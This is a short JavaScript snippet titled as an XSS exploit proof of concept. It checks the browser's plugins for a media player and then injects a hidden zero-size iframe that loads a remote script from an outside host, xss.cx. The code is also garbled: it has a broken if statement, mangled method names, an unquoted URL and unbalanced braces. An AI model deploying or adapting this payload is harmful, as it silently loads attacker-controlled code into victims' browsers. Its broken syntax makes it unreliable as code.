============================================
XSS Exploit PoC #2
============================================
function cx () {
	try {
			for (var i = 0; i < navigator.plugins.length; i++) {
			if {name.indexOf("Media Player") != -1) {
				var m = document.create.Element("iframe");
				m.setAttribute("src", http://xss.cx/xss.js:);
				m.setAttribute("width", 0);
				m.setAttribute("height", 0);
				m.setAttribute("frameborder", 0);
				document.body.appendChild(m);
			}
		} catch (e) {
		}
		cx();
